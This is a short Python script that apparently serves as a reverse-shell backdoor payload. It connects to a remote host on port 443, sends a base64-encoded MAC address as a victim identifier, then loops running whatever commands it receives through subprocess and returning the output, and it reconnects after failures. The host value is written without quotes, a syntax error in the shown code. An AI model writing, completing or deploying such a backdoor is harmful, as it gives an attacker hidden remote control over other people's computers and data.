import threading
import subprocess as sp
import socket
import uuid
import base64
import time



def payload():
    HOST = 127.0.0.1    # The remote host
    PORT = 443               # The same port as used by the server
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            a=hex(uuid.getnode())
            a = bytes(a, 'utf-8')
            a=base64.b64encode(a)
            s.sendall(a)
            while True:
                msg=s.recv(2048).decode('utf-8')
                output = sp.getoutput(msg)
                msg = bytes(output + " ", 'utf-8')
                s.sendall(msg)
    except socket.error as error:
        time.sleep(10)
        payload()
payload()
